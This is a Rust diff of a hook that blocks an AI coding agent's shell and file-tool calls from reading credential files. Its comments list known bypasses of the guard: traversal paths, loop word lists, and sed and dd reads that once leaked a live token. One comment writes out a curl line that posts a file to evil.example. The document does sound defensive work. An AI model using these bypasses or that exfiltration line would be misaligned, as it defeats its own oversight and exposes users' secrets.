@@ -141,11 +141,11 @@
 //! `docs/secrets-integration-spec`" — a git BRANCH, matched by `*secrets*` and
 //! admitted as a file only by the `/` in front of it. A word list is not a path
 //! operand list: the body decides what the variable is for, and the name
-//! reaches the body as `$b`. [`for_word_list_start`] identifies the list by
+//! reaches the body as `$b`. [`for_word_list_start`](super::pm_guard_secret_positions::for_word_list_start) identifies the list by
 //! POSITION, the way [`pattern_argument_index`] and [`inline_program_indices`]
-//! identify theirs — skipping any [`LIST_INTRODUCERS`] keyword in front of it,
+//! identify theirs — skipping any [`LIST_INTRODUCERS`](super::pm_guard_secret_positions::LIST_INTRODUCERS) keyword in front of it,
 //! so a header nested behind an outer `do`/`then` reads the same — and inside
-//! it [`reads_as_a_branch_name`] withdraws that one proxy.
+//! it [`reads_as_a_branch_name`](super::pm_guard_secret_positions::reads_as_a_branch_name) withdraws that one proxy.
 //!
 //! The withdrawal needs POSITIVE evidence, not merely the absence of file
 //! shape: round 13's first cut dropped every word-family name with no dot and
@@ -155,7 +155,7 @@
 //! EXTENSIONLESS credential files, each one ALLOWED through a `for` header
 //! while the same operand written directly still denied. A bypass keyed on a
 //! shell keyword is the rounds 1-to-4 failure mode in a new spelling, so the
-//! word must now sit under a [`BRANCH_NAME_PREFIXES`] first component and not
+//! word must now sit under a [`BRANCH_NAME_PREFIXES`](super::pm_guard_secret_positions::BRANCH_NAME_PREFIXES) first component and not
 //! be a bare family core. That allowlist fails CLOSED on anything it does not
 //! carry (see `WORD_LIST_BYPASS_CORPUS`), and a name with file shape of its own
 //! denies in a word list regardless, so `for f in .env secrets.txt; do cat
@@ -170,9 +170,9 @@
 //! `git branch feat/7527-tm-secrets-skill` and `git branch -m …` were all
 //! refused, because a branch matched by `*secrets*` is admitted as a file by
 //! the `/` in front of it — the one proxy round 13 had already withdrawn from a
-//! word list. [`ref_name_start`] identifies the ref position the way
-//! [`for_word_list_start`] identifies its list, and the two compose onto the
-//! SAME predicate — [`reads_as_a_branch_name`], the branch-prefix allowlist
+//! word list. [`ref_name_start`](super::pm_guard_secret_positions::ref_name_start) identifies the ref position the way
+//! [`for_word_list_start`](super::pm_guard_secret_positions::for_word_list_start) identifies its list, and the two compose onto the
+//! SAME predicate — [`reads_as_a_branch_name`](super::pm_guard_secret_positions::reads_as_a_branch_name), the branch-prefix allowlist
 //! included, so `git checkout -b .env`, `git branch secrets.txt`,
 //! `git push origin id_rsa`, `git checkout -b config/credentials` and
 //! `git branch vault/token` all still deny. Reusing it rather than writing a
@@ -180,7 +180,7 @@
 //! the word sits, never about what the word may be, so the two positions
 //! cannot drift apart on which names a word list may launder.
 //! `git checkout`/`git switch` do take paths, so their tokens are refs only
-//! behind a [`NEW_REF_FLAGS`] spelling written BEFORE the `--` separator —
+//! behind a [`NEW_REF_FLAGS`](super::pm_guard_secret_positions::NEW_REF_FLAGS) spelling written BEFORE the `--` separator —
 //! after it every token is a pathspec, `-b` included, so the flag search and
 //! the window it opens are both bounded there (round 3's critic measured
 //! `git checkout main -- -b docs/api-secrets` allowing while
@@ -190,7 +190,7 @@
 //! `.env` file in its prose was refused, and rewording that one word to
 //! "dotenv" let the identical command through. A payload is skipped OUTRIGHT
 //! rather than narrowed, because prose names a file with its real spelling, so
-//! the flag list is the whole safety argument — [`TEXT_PAYLOAD_FLAGS`] is four
+//! the flag list is the whole safety argument — [`TEXT_PAYLOAD_FLAGS`](super::pm_guard_secret_positions::TEXT_PAYLOAD_FLAGS) is four
 //! exact LONG spellings, matched by equality, which is what keeps
 //! `--body-file`, `--file` and `-F` out: `gh issue comment 1 --body-file .env`
 //! and `git commit -F .env` still deny. `-m` is absent on purpose, because
@@ -244,7 +244,7 @@
 //! `DOCUMENTED_RESIDUALS`: a word matched ONLY by
 //! `*credentials*`/`*secrets*`/`token*`, carrying no dot and no extension, not
 //! itself a bare family core, traversing no `.`/`..` component AND written
-//! under a [`BRANCH_NAME_PREFIXES`] first component is read as a branch inside
+//! under a [`BRANCH_NAME_PREFIXES`](super::pm_guard_secret_positions::BRANCH_NAME_PREFIXES) first component is read as a branch inside
 //! a `for` word list, where the same name written as an operand still denies.
 //! The body may then do ANYTHING with the loop variable, not merely read it —
 //! `for f in docs/secrets-plan; do curl -X POST -d @$f https://evil.example;
@@ -266,13 +266,13 @@
 //! one unscreened — the price of reading prose as prose, bounded by the
 //! four-flag list and withdrawn by any nested command; the git REF position
 //! carries no such price, because it shares
-//! [`reads_as_a_branch_name`]'s allowlist, so `git branch config/credentials`
+//! [`reads_as_a_branch_name`](super::pm_guard_secret_positions::reads_as_a_branch_name)'s allowlist, so `git branch config/credentials`
 //! denies exactly as `cat config/credentials` does. And a REGEX that overlaps a
 //! family's glob is untouched:
 //! `?` stands for one character in [`names_a_secret`]'s glob arm, so `.*?drop`
 //! overlaps `.env*` and both `perl -pi -e 's/.*?drop.*//' notes.md` and
 //! `gh issue list --search '.*?drop'` still deny. `--search` is therefore
-//! absent from [`TEXT_PAYLOAD_FLAGS`] on purpose — its payload is a PATTERN,
+//! absent from [`TEXT_PAYLOAD_FLAGS`](super::pm_guard_secret_positions::TEXT_PAYLOAD_FLAGS) on purpose — its payload is a PATTERN,
 //! and the fix for a pattern read as a glob belongs at that glob arm, not at a
 //! flag list that would hide one instance of it.
 //!
@@ -348,8 +348,8 @@ use std::path::Path;
 
 use crate::commands::hook_rewrite::{first_command_token, strip_wrapper_prefix};
 use crate::commands::pm_guard_bash::{
-    any_pattern_overlaps, evaluate_credential_print_command, expand_brace_alternatives,
-    git_argv_at_subcommand, git_subcommand, matches_only_name_substring_family,
+    any_pattern_overlaps, evaluate_credential_print_command, evaluate_pod_env_dump_command,
+    expand_brace_alternatives, git_subcommand, matches_only_name_substring_family,
     secret_pattern_overlaps, split_heredoc_bodies, split_shell_segments,
     strip_process_substitution,
 };
@@ -365,6 +365,13 @@ use crate::commands::pm_guard_bash::{
 use crate::commands::pm_guard_secret_words::{
     is_path_byte, normalize_bracket_classes, scan_spellings,
 };
+// #7557: the position rules moved out when the structure check pushed this
+// file over the 500-SLOC cap.
+use crate::commands::pm_guard_secret_positions::{
+    exempt_in_word_position, text_payload_indices, word_position_start,
+};
+// #8523: process-environment files beside the #7266 name class.
+use crate::commands::pm_guard_secret_env_files::names_a_process_manager_dump;
 
 /// Which kind of text a word scan is reading (#7266 round 9).
 ///
@@ -445,7 +452,7 @@ const CONTENT_REVEALING_GIT_FLAGS: &[&str] = &["--patch", "--interactive", "--ed
 /// What: substrings checked against the raw segment; any hit withdraws the
 /// allowlist, so the segment falls through to the deny.
 /// Test: `denies_a_safe_verb_wrapping_a_substitution`.
-const NESTED_COMMAND_MARKERS: &[&str] = &["$(", "`", "<(", ">(", "${"];
+pub(crate) const NESTED_COMMAND_MARKERS: &[&str] = &["$(", "`", "<(", ">(", "${"];
 
 /// The four SSH key families whose `.pub` half is a PUBLIC key.
 ///
@@ -495,6 +502,10 @@ fn is_ssh_public_key_name(basename: &str) -> bool {
 /// `denies_a_glob_that_expands_onto_a_secret_file`,
 /// `allows_program_text_that_only_looks_like_a_brace_group`.
 fn denies_as_a_read_target(path: &str, scan: Scan) -> bool {
+    // #8523: pm2's `save` file holds every managed process's environment.
+    if names_a_process_manager_dump(path) {
+        return true;
+    }
     let base = normalize_bracket_classes(&command_basename(path));
     if base.is_empty() || is_ssh_public_key_name(&base) {
         return false;
@@ -542,7 +553,8 @@ const TRANSPARENT_SOURCE_EXTENSIONS: &[&str] = &[
 /// tool call are decided by the same rule and reported with the same reason.
 /// What: routes `Bash` to [`evaluate_secret_file_read_command`] over its
 /// `command` string, then to [`evaluate_credential_print_command`] (#8596,
-/// #8248: a credential CLI prints the same bytes with no file named), and
+/// #8248: a credential CLI prints the same bytes with no file named), then to
+/// `evaluate_pod_env_dump_command` (#7648: a pod's environment dump), and
 /// every other tool to [`evaluate_secret_file_read_tool`].
 /// Test: `the_unified_entry_point_routes_both_surfaces`,
 /// `the_unified_entry_point_refuses_a_printed_credential`.
@@ -556,7 +568,9 @@ pub(crate) fn evaluate_secret_file_read(
             .and_then(|v| v.as_str())
             .unwrap_or_default();
         return evaluate_secret_file_read_command(command)
-            .or_else(|| evaluate_credential_print_command(command));
+            .or_else(|| evaluate_credential_print_command(command))
+            // #7648: a pod's env dump prints injected Secrets, naming no file.
+            .or_else(|| evaluate_pod_env_dump_command(command));
     }
     evaluate_secret_file_read_tool(tool_name, tool_input)
 }
@@ -716,7 +730,7 @@ fn secret_words_in_segment(segment: &str, lone: bool) -> Vec<String> {
     // #7498: the words after `in` are a loop's word LIST, and the words in a
     // ref-creating position are REF names — neither is a path operand list, and
     // both withdraw the same one arm.
-    let word_list_from = for_word_list_start(segment, &argv).or_else(|| ref_name_start(segment));
+    let position = word_position_start(segment, &argv);
     let mut out: Vec<String> = Vec::new();
     for (index, token) in argv.iter().enumerate() {
         if Some(index) == pattern_at || text_payloads.contains(&index) {
@@ -727,9 +741,11 @@ fn secret_words_in_segment(segment: &str, lone: bool) -> Vec<String> {
         } else {
             secret_files_named_in(token, Scan::Argv)
         };
-        let in_word_list = word_list_from.is_some_and(|from| index >= from);
         for word in words {
-            if in_word_list && reads_as_a_branch_name(&word) {
+            // #7557: judged on the token's structure, not on a cut fragment.
+            if position.is_some_and(|(from, kind)| {
+                index >= from && exempt_in_word_position(token, &word, kind)
+            }) {
                 continue;
             }
             if !out.contains(&word) {
@@ -738,327 +754,6 @@ fn secret_words_in_segment(segment: &str, lone: bool) -> Vec<String> {
         }
     }
     out
-}
-
-/// Shell keywords whose `<var> in <words>` header is a WORD LIST (#7498).
-///
-/// Why: `for` and `select` are the two compound commands that bind a variable
-/// to a list of literal words. Nothing in that list is handed to a program as
-/// a path — the body decides what the variable is used for, and it reaches the
-/// body as `$var`.
-/// Test: `allows_a_for_loop_word_list_of_branch_names`.
-const WORD_LIST_KEYWORDS: &[&str] = &["for", "select"];
-
-/// Where a segment's `for`/`select` WORD LIST begins, if it is one (#7498).
-///
-/// Why: `split_shell_segments` cuts at `;`, so `for b in … ; do … ; done`
-/// reaches this rule as a segment whose first token is the keyword `for`. The
-/// scan then read every word after it as argv, and a git BRANCH name that
-/// carries `secrets`/`credentials`/`token` refused the whole loop — live on tm
-/// 1.5.33, `for b in feat/x fix/y docs/secrets-integration-spec; do …` was
-/// refused for "naming" a branch this guard never opened (#7498).
-/// What: the index just past `for <var> in`, when the segment lexes to that
-/// header and runs no nested command. A nested command (`for f in $(ls …)`)
-/// withdraws it, because the words are then whatever that command prints rather
-/// than the literal list written here. `None` for every other segment, so no
-/// ordinary argv reaches the narrowed shape test. The keyword is identified by
-/// POSITION, exactly as [`pattern_argument_index`] and [`inline_program_indices`]
-/// identify theirs — this adds no verb to any list.
-///
-/// Round 13 critic MEDIUM: a header NESTED in an outer compound command keeps
-/// the introducing keyword in front of it, because `split_shell_segments` cuts
-/// at `;` and not at `do`. `for a in 1; do for b in <branch>; do …` and
-/// `if true; then for b in <branch>; do …` therefore arrive as `do for b in …`
-/// and `then for b in …`, which position 0 alone does not recognise. Those
-/// [`LIST_INTRODUCERS`] are skipped first, so a nested header is read exactly
-/// like a top-level one.
-/// Test: `allows_a_for_loop_word_list_of_branch_names`,
-/// `denies_a_secret_file_in_a_for_loop_word_list`.
-fn for_word_list_start(segment: &str, argv: &[String]) -> Option<usize> {
-    if NESTED_COMMAND_MARKERS.iter().any(|m| segment.contains(m)) {
-        return None;
-    }
-    let at = argv
-        .iter()
-        .position(|t| !LIST_INTRODUCERS.contains(&t.as_str()))?;
-    if !WORD_LIST_KEYWORDS.contains(&argv.get(at)?.as_str()) || argv.get(at + 2)? != "in" {
-        return None;
-    }
-    (argv.len() > at + 3).then_some(at + 3)
-}
-
-/// Shell keywords that only INTRODUCE a command list, carrying no operand.
-///
-/// Why: see [`for_word_list_start`] — `split_shell_segments` cuts at `;`, so a
-/// nested `for` header reaches the scan behind the `do` or `then` of the
-/// command that contains it.
-/// Test: `allows_a_for_loop_word_list_of_branch_names`.
-const LIST_INTRODUCERS: &[&str] = &["do", "then", "else", "elif", "{"];
-
-/// The first path component of a conventional git BRANCH or REF name.
-///
-/// Why: round 13's first cut withdrew the directory-prefix proxy from every
-/// word-family name in a word list, and its critic measured the bypass that
-/// opened: `~/.aws/credentials`, `/var/run/secrets/kubernetes.io/serviceaccount/token`,
-/// `/etc/secrets`, `vault/token` and `config/credentials` are the canonical
-/// EXTENSIONLESS credential files, and each one ALLOWED through a `for` header
-/// while the same operand written directly still denied — a bypass keyed on a
-/// shell keyword, which is the rounds 1-to-4 failure mode in a new spelling.
-/// The withdrawal therefore needs a positive reason to believe the word is a
-/// ref, not merely the absence of file shape.
-/// What: an ALLOWLIST, so an unrecognised first component keeps the deny and
-/// the gate fails CLOSED. These seven are the conventional-commit branch
-/// prefixes plus `refs`, the git ref namespace; none of them is an absolute
-/// path or a `~` expansion, both of which leave a first component this list
-/// cannot contain.
-///
-/// This is an accepted TRADE, not a claim that no credential file lives under
-/// these seven — one can: `docs/api-secrets` and `release/gpg-secrets` deny in
-/// argv and allow in a word list. The `DOCUMENTED_RESIDUALS` rows pin that gap
-/// so its width is asserted rather than asserted-about (#7498 round 13
-/// critic). What the trade buys is every branch-name loop, which is everyday
-/// git work; what it costs is an extensionless file under a branch-shaped
-/// directory, reachable only through the loop variable.
-/// Test: `allows_a_for_loop_word_list_of_branch_names`,
-/// `denies_a_secret_file_in_a_for_loop_word_list`,
-/// `the_documented_residuals_still_allow`.
-const BRANCH_NAME_PREFIXES: &[&str] =
-    &["feat", "fix", "docs", "hotfix", "release", "chore", "refs"];
-
-/// Whether `word`, inside a `for`/`select` word list, reads as a git BRANCH or
-/// REF name rather than a path (#7498).
-///
-/// Why: [`names_a_secret_file`]'s last arm is the proxy the three English-word
-/// families use for "this is a file rather than a word" — a `/` in the word.
-/// That proxy misreads a branch: `docs/secrets-integration-spec` refused a
-/// whole loop while the guard opened nothing. This predicate is the narrowest
-/// reason to set the proxy aside, and it withdraws nothing that carries file
-/// shape of its own.
-/// What: four clauses, all required. No leading `.`, no extension and matched
-/// only by `pm_guard_bash::matches_only_name_substring_family` are the three
-/// tests [`names_a_secret_file`] takes BEFORE that last arm, inverted — so
-/// `.env`, `secrets.txt`, `credentials.json`, `*.pem` and `id_rsa` are
-/// untouched. The fourth is the positive evidence the critic's bypass corpus
-/// showed was missing: the basename is not itself a bare family core
-/// (`credentials`, `secrets`, `token`), the word TRAVERSES no `.` or `..`
-/// component, and its FIRST component is a [`BRANCH_NAME_PREFIXES`] entry.
-///
-/// The traversal clause is round 13's second critic round. The allowlist reads
-/// the word's SPELLING, so `feat/../secrets/prod-credentials` presented `feat`
-/// as its first component while naming a path outside every prefix — it
-/// ALLOWED on `acfb7c70a` while `cat feat/../secrets/prod-credentials` denied,
-/// and the same loop without `feat/../` is a `WORD_LIST_BYPASS_CORPUS` row.
-/// `docs/../secrets/prod-credentials`,
-/// `feat/../../../../etc/db-credentials`, `refs/../../../var/run/my-secrets`
-/// and `feat/../../.aws/aws-credentials` are the same escape. The prefix must
-/// therefore say where the word LIVES, not merely how it starts. Rejecting
-/// both dot components costs no legitimate loop: `git check-ref-format`
-/// rejects `.` and `..` in a ref name, so no branch is spelled with either.
-/// Test: `reads_as_a_branch_name_needs_a_branch_prefix`,
-/// `denies_a_secret_file_in_a_for_loop_word_list`.
-fn reads_as_a_branch_name(word: &str) -> bool {
-    let base = normalize_bracket_classes(&command_basename(word));
-    // #7533: the same three tests `names_a_secret_file` takes, inverted — so
-    // the empty-extension reading of a trailing `.` is set aside here too.
-    if base.starts_with('.')
-        || has_a_named_extension(&base)
-        || !matches_only_name_substring_family(&base)
-    {
-        return false;
-    }
-    // #7498 round 13 critic: `config/credentials` and `/etc/secrets` name the
-    // canonical extensionless credential files, so a bare family core is never
-    // a branch and an unlisted first component is never trusted.
-    if ["credentials", "secrets", "token"].contains(&base.to_ascii_lowercase().as_str()) {
-        return false;
-    }
-    let mut components = word.split('/');
-    let first_is_a_prefix = components
-        .next()
-        .is_some_and(|first| BRANCH_NAME_PREFIXES.contains(&first));
-    // #7498: a `..` after the prefix escapes it, so the prefix would say how
-    // the word is SPELLED rather than where it lives.
-    first_is_a_prefix && !components.any(|c| c == "." || c == "..")
-}
-
-/// git subcommands whose positional arguments name a REF, never a path (#7498
-/// round 3).
-///
-/// Why: `git branch <name>` and `git push <remote> <refspec>` take no path
-/// operand at all — every positional is a branch, a tag, a remote or a
-/// refspec. A branch called `docs/secrets-integration-spec` is then a "secret
-/// file" on the strength of its `/`, which is the same proxy round 13 withdrew
-/// from a `for` word list, reached through a different position.
-/// What: compared against `pm_guard_bash::git_subcommand`'s answer, so
-/// `git -C <path> branch …` resolves the same way. `git tag`, `git merge` and
-/// every other ref-taking subcommand are deliberately ABSENT: an unlisted
-/// subcommand keeps the pre-fix answer, which is the fail-CLOSED side.
-/// Test: `allows_a_git_ref_name_carrying_a_word_family`,
-/// `denies_a_secret_file_in_a_git_ref_position`.
-const REF_NAMING_GIT_SUBCOMMANDS: &[&str] = &["branch", "push"];
-
-/// `checkout`/`switch` flags whose next token is a NEW ref name (#7498 round 3).
-///
-/// Why: `git checkout` and `git switch` DO take paths — `git checkout main --
-/// src/x` restores a file — so their positionals cannot be read as refs the way
-/// [`REF_NAMING_GIT_SUBCOMMANDS`]'s are. The new-branch flag is what makes the
-/// token after it a ref: `-b`/`-B` for `checkout`, `-c`/`-C` for `switch`.
-/// Test: `allows_a_git_ref_name_carrying_a_word_family`,
-/// `denies_a_secret_file_in_a_git_ref_position`.
-const NEW_REF_FLAGS: &[&str] = &["-b", "-B", "-c", "-C"];
-
-/// Where a segment's git REF names begin, if it names refs at all (#7498
-/// round 3).
-///
-/// Why: live on tm 1.5.33, `git checkout -b feat/7526-secrets-manager-agent`,
-/// `git switch -c feat/7527-tm-secrets-skill`, `git branch
-/// feat/7527-tm-secrets-skill` and `git branch -m feat/7527-tm-secrets-skill`
-/// were all refused for naming a secret-bearing file. A git ref argument is
-/// never a file's bytes, and every child of an epic whose subject is secrets
-/// wants that word in its branch name.
-/// What: `Some(index)` — the first token that names a ref — for a
-/// [`REF_NAMING_GIT_SUBCOMMANDS`] call, for a `checkout`/`switch` call at
-/// the token after its [`NEW_REF_FLAGS`] spelling, and for `worktree add` at
-/// its first operand (#7533). A nested command withdraws
-/// it, exactly as it withdraws [`for_word_list_start`], because the words are
-/// then whatever that command prints. `None` for every other segment, so no
-/// ordinary argv reaches the narrowed shape test. The position is what is
-/// identified, never the verb — this adds nothing to [`SAFE_HANDLING_VERBS`] or
-/// [`SAFE_GIT_SUBCOMMANDS`], and the narrowing it enables is the single
-/// predicate the word-list rule already uses ([`reads_as_a_branch_name`],
-/// [`BRANCH_NAME_PREFIXES`] allowlist included), so `git checkout -b .env`,
-/// `git push origin id_rsa` and `git checkout -b config/credentials` still
-/// deny.
-///
-/// The `--` separator bounds BOTH halves of that answer, which the first cut
-/// got only half right (#7498 round 3 critic MEDIUM). git reads every token
-/// after `--` as a PATHSPEC, one spelled `-b` included, so scanning for the
-/// new-branch flag across the whole tail let a flag BEHIND the separator open a
-/// ref window over the real pathspec: `git checkout main -- -b docs/api-secrets`
-/// ALLOWED while `git checkout main -- docs/api-secrets` denied. The search and
-/// the result are now both confined to the tokens BEFORE the first `--`, so no
-/// token at or after it can open a window — which also subsumes the earlier
-/// separate `--` test.
-///
-/// The subcommand's index comes from `pm_guard_bash::git_argv_at_subcommand`,
-/// which returns the argv and the index together. Re-deriving that index by
-/// string equality is a second argv parse — the defect that helper's own doc
-/// says it exists to prevent — and it mis-indexes a segment whose global option
-/// value repeats the subcommand name (`git -C branch branch x`).
-/// Test: `allows_a_git_ref_name_carrying_a_word_family`,
-/// `denies_a_secret_file_in_a_git_ref_position`.
-fn ref_name_start(segment: &str) -> Option<usize> {
-    if NESTED_COMMAND_MARKERS.iter().any(|m| segment.contains(m)) {
-        return None;
-    }
-    // #7498 critic: one parser answers both "which subcommand" and "at which
-    // index", so the two can never disagree.
-    let (argv, at) = git_argv_at_subcommand(segment)?;
-    let sub = argv.get(at)?.as_str();
-    // #7498 critic: `--` ends the options; everything after it is a pathspec.
-    let end_of_options = argv
-        .iter()
-        .enumerate()
-        .skip(at + 1)
-        .find(|(_, token)| *token == "--")
-        .map_or(argv.len(), |(index, _)| index);
-    let from = if REF_NAMING_GIT_SUBCOMMANDS.contains(&sub) {
-        at + 1
-    } else if sub == "worktree" && argv.get(at + 1).is_some_and(|t| t == "add") {
-        // #7533: every operand of `git worktree add` is a new tree's PATH or a
-        // commit-ish, and neither prints a file's bytes. `list`, `remove` and
-        // `prune` are absent, so they keep the pre-fix answer.
-        at + 2
-    } else if matches!(sub, "checkout" | "switch") {
-        // #7498: the new-branch flag is what makes the next token a ref, and
-        // only a flag before the separator is a flag at all.
-        at + 2
-            + argv
-                .get(at + 1..end_of_options)?
-                .iter()
-                .position(|t| NEW_REF_FLAGS.contains(&t.as_str()))?
-    } else {
-        return None;
-    };
-    (from < end_of_options).then_some(from)
-}
-
-/// Flags whose next token is a human-readable TEXT PAYLOAD, never a path
-/// (#7498 round 3).
-///
-/// Why: live on tm 1.5.33, a `gh issue comment 7517 --body …` whose prose named
-/// a `.env` file was refused for naming `.env` in a `gh` command. The body is a
-/// value written for a person to read; rewording it to "dotenv" let the
-/// identical command through, which is the signature of a rule reading prose as
-/// argv.
-/// What: LONG spellings only, matched by exact token equality, plus the joined
-/// `--body=…` form. Exact equality is what keeps the FILE flags out — a
-/// `--body-file`, `--file` or `-F` token is not `--body`, so
-/// `gh issue comment 1 --body-file .env` and `git commit -F .env` still deny.
-/// `-m` is deliberately ABSENT even though `git commit -m` is the commonest
-/// spelling of a message: a bare `-m` is overloaded across programs, and
-/// `sort -m .env` MERGES and prints the files after it, so exempting the token
-/// after every `-m` would be a bypass rather than a false-positive fix. That
-/// keeps round 5's deliberate cost for `git commit -m "add .env"` in place.
-///
-/// The skip is VERB-AGNOSTIC by design, so `somecmd --body .env` allows for any
-/// program. Two assumptions carry that, stated here so the next round need not
-/// re-derive them (#7498 round 3 critic LOW):
-///
-/// 1. No program takes a FILE to read behind one of these four exact
-///    spellings. A file variant is spelled differently — `--body-file`,
-///    `--file`, `-F`, `--notes-file` — and exact equality keeps every one of
-///    them screened. Keying on the verb instead would be the rounds-1-to-4
-///    failure mode, so the flag list, not a program list, is what must stay
-///    short.
-/// 2. GNU `getopt_long` accepts any UNAMBIGUOUS abbreviation of a long option,
-///    and this rule does not. That asymmetry is safe in one direction and not
-///    the other. An abbreviation an agent writes (`--bod .env`) is not one of
-///    these spellings, so it is still screened — over-refusal, the correct
-///    side. The uncovered case is a program that defines ONLY a longer
-///    file-reading option of which one of these four is a prefix (a
-///    `--message-file` with no `--message`), where the program would read the
-///    file while this rule reads the token as prose. No such spelling is known
-///    in the tools an agent here drives; a reported one is a flag to REMOVE
-///    from this list, never a program to exempt.
-///
-/// Test: `allows_a_filename_named_in_a_text_payload`,
-/// `denies_a_file_flag_beside_a_text_payload`.
-const TEXT_PAYLOAD_FLAGS: &[&str] = &["--body", "--title", "--message", "--note"];
-
-/// Which tokens of `argv` are a human-readable TEXT PAYLOAD (#7498 round 3).
-///
-/// Why: see [`TEXT_PAYLOAD_FLAGS`]. Unlike [`ref_name_start`], a payload is
-/// skipped OUTRIGHT rather than narrowed to one arm, because prose names a file
-/// with its real spelling — `--body "the agent reads .env"` carries the dotfile
-/// itself. That makes the flag list the whole safety argument, so it is exact
-/// spellings of long options and nothing else.
-/// What: the index of every token that is the joined `<flag>=…` form, and of
-/// every token whose PREDECESSOR is an exact [`TEXT_PAYLOAD_FLAGS`] spelling.
-/// Empty when the segment runs a nested command, so
-/// `gh issue comment 1 --body "$(cat .env)"` still denies. Empty is also the
-/// answer for every segment carrying none of the flags, which leaves the scan
-/// exactly as it was.
-/// Test: `allows_a_filename_named_in_a_text_payload`,
-/// `denies_a_file_flag_beside_a_text_payload`.
-fn text_payload_indices(segment: &str, argv: &[String]) -> Vec<usize> {
-    if NESTED_COMMAND_MARKERS.iter().any(|m| segment.contains(m)) {
-        return Vec::new();
-    }
-    argv.iter()
-        .enumerate()
-        .filter(|(index, token)| {
-            TEXT_PAYLOAD_FLAGS.iter().any(|flag| {
-                token
-                    .strip_prefix(*flag)
-                    .is_some_and(|rest| rest.starts_with('='))
-            }) || index
-                .checked_sub(1)
-                .and_then(|prev| argv.get(prev))
-                .is_some_and(|prev| TEXT_PAYLOAD_FLAGS.contains(&prev.as_str()))
-        })
-        .map(|(index, _)| index)
-        .collect()
 }
 
 /// Every distinct word of one PROGRAM TEXT block that names a secret file.
@@ -1198,6 +893,10 @@ fn secret_files_named_in(text: &str, scan: Scan) -> Vec<String> {
 /// Test: `allows_the_ordinary_command_corpus`,
 /// `a_word_family_counts_only_when_it_is_written_as_a_path`.
 fn names_a_secret_file(word: &str, scan: Scan) -> bool {
+    // #8523: a pm2 dump, or a glob over the pm2 home, is a file by its name.
+    if names_a_process_manager_dump(word) {
+        return true;
+    }
     let base = normalize_bracket_classes(&command_basename(word));
     if base.is_empty() || !denies_as_a_read_target(&base, scan) {
         return false;
@@ -1390,12 +1089,15 @@ fn describe_command(segment: &str) -> String {
 /// second native tool: with `output_mode="content"` it prints every matching
 /// line verbatim, so `Grep(pattern=".", path="terraform.tfvars")` dumps the
 /// file without a shell ever running. A tool call carries no shell to lex, so
-/// these arms read their path fields directly.
-/// What: `Some(reason)` when `tool_name` is `Read` and its `file_path`'s
-/// basename satisfies [`is_secret_read_target`], or when `tool_name` is `Grep`
-/// and [`evaluate_grep_tool`] answers; `None` for every other tool and for a
-/// call with no readable path field.
-/// Test: `denies_a_read_tool_call_with_a_range`,
+/// these arms read their path fields directly. #8483: `Edit`, `MultiEdit` and
+/// `Write` reach the same file's content — an `Edit` echoes the lines around
+/// its change — and changed a tfvars file the Bash rule had refused to read.
+/// What: `Some(reason)` when `tool_name` is `Read`, `Edit`, `MultiEdit` or
+/// `Write` and its `file_path`'s basename satisfies [`is_secret_read_target`],
+/// or when `tool_name` is `Grep` and [`evaluate_grep_tool`] answers; `None` for
+/// every other tool and for a call with no readable path field.
+/// Test: `judges_an_edit_or_write_like_a_bash_read_8483`,
+/// `denies_a_read_tool_call_with_a_range`,
 /// `denies_a_read_tool_call_without_a_range`,
 /// `allows_a_read_of_an_ordinary_file`,
 /// `denies_a_grep_tool_call_on_a_secret_bearing_path`,
@@ -1407,10 +1109,11 @@ pub(crate) fn evaluate_secret_file_read_tool(
     tool_input: Option<&serde_json::Value>,
 ) -> Option<String> {
     match tool_name {
-        "Read" => {
+        // #8483: an edit tool is judged exactly as the Bash read of its file.
+        "Read" | "Edit" | "MultiEdit" | "Write" => {
             let target = string_field(tool_input, "file_path")?;
             denies_as_a_read_target(target, Scan::Argv)
-                .then(|| deny_reason(target, "the `Read` tool"))
+                .then(|| deny_reason(target, &format!("the `{tool_name}` tool")))
         }
         "Grep" => evaluate_grep_tool(tool_input),
         _ => None,
@@ -1549,7 +1252,7 @@ fn selects_every_name(candidate: &str) -> bool {
 /// literal (`id_rsa.` still matches `id_rsa*`).
 /// Test: `allows_a_word_family_followed_by_a_full_stop_7533`,
 /// `a_word_family_counts_only_when_it_is_written_as_a_path`.
-fn has_a_named_extension(basename: &str) -> bool {
+pub(crate) fn has_a_named_extension(basename: &str) -> bool {
     Path::new(basename)
         .extension()
         .is_some_and(|e| !e.is_empty())
@@ -1571,7 +1274,7 @@ fn has_extension_in(basename: &str, extensions: &[&str]) -> bool {
 
 /// The basename of a command or path token, with a process-substitution wrapper
 /// and a leading `\` quote removed.
-fn command_basename(token: &str) -> String {
+pub(crate) fn command_basename(token: &str) -> String {
     // #7266 round 3: `diff <(cat .env) /dev/null` lexes to the tokens `<(cat`
     // and `.env)`, so the wrapper comes off before any basename match.
     let token = strip_process_substitution(token);
@@ -1590,7 +1293,7 @@ fn deny_reason(target: &str, how: &str) -> String {
         "naming `{target}` in {how} is refused (issue #7266) — its name is in this guard's \
          secret-bearing file class (`*.tfvars`, `*.tfvars.json`, `*.tfstate*`, `.env`/`.env.*`, \
          `*.pem`, `*.key`, an SSH private key `id_rsa`/`id_dsa`/`id_ecdsa`/`id_ed25519`, \
-         `.netrc`, `*.p12`/`*.pfx`/`*.jks`/`*.kdbx`, `*.ovpn`, or a name carrying \
+         `.netrc`, `*.p12`/`*.pfx`/`*.jks`/`*.kdbx`, `*.ovpn`, a pm2 `dump.pm2`, or a name carrying \
          `credentials`/`secrets`/`token`). This rule keys on the FILE, not on the verb: four \
          earlier rounds enumerated reading verbs and each was bypassed by one the list did not \
          name — `sed -n '38,46p'` printed a live ngrok authtoken, then `dd if=`, `tar cf -`, \
@@ -1611,6 +1314,10 @@ mod tests {
     use crate::commands::pm_guard_secret_words::{
         bounded_brace_readings, drop_split_orphan_braces, matching_close_brace,
         rewrite_parameter_expansions, split_parameter_expansion, walk_parameter_expansions,
+    };
+    // #7557: the position rules this module's tests still own.
+    use crate::commands::pm_guard_secret_positions::{
+        WordPosition, exempt_in_word_position, is_a_well_formed_ref_name, reads_as_a_branch_name,
     };
 
     fn eval(command: &str) -> Option<String> {
@@ -1849,6 +1556,95 @@ mod tests {
                 "`{word}` must keep the directory-prefix proxy"
             );
             assert!(names_a_secret_file(word, Scan::Argv), "{word}");
+        }
+    }
+
+    /// 🔴 REGRESSION (#7557): the prefix exemption judged the word's SPELLING.
+    /// A glob component bash (<= 5.1) expands onto `..`, and a fragment the
+    /// path-byte cut lifted out of a token living elsewhere, each presented a
+    /// branch prefix while naming a path outside it. Every row ALLOWED on
+    /// `c3c63e72f`.
+    #[test]
